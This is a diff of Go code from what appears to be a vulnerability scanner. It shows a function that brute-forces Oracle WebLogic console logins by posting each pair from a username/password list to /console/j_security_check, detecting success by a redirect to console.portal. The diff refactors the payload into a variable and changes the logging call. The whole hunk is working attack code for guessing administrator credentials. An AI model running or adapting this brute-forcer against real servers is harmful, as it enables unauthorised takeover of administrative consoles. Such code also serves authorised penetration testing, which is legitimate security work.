@@ -12,10 +12,12 @@ import (
 func Weblogic_brute(url string) (username string, password string) {
 	if req, err := util.HttpRequset(url+"/console/login/LoginForm.jsp", "GET", "", false, nil); err == nil {
 		if req.StatusCode == 200 {
+			var pay string
 			for uspa := range weblogicuserpass {
-				if req2, err2 := util.HttpRequset(url+"/console/j_security_check", "POST", fmt.Sprintf("j_username=%s&j_password=%s", weblogicuserpass[uspa].username, weblogicuserpass[uspa].password), true, nil); err2 == nil {
+				pay = fmt.Sprintf("j_username=%s&j_password=%s", weblogicuserpass[uspa].username, weblogicuserpass[uspa].password)
+				if req2, err2 := util.HttpRequset(url+"/console/j_security_check", "POST", pay, true, nil); err2 == nil {
 					if util.StrContains(req2.RequestUrl, "console.portal") {
-						util.BurteLog(fmt.Sprintf("Found vuln Weblogic password|%s:%s|%s\n", weblogicuserpass[uspa].username, weblogicuserpass[uspa].password, url+"/console/"))
+						util.SendLog(req2.RequestUrl, "weblogic_brute", fmt.Sprintf("Found vuln Weblogic password|%s:%s|%s\n", weblogicuserpass[uspa].username, weblogicuserpass[uspa].password, url+"/console/"), pay)
 						return weblogicuserpass[uspa].username, weblogicuserpass[uspa].password
 					}
 				}
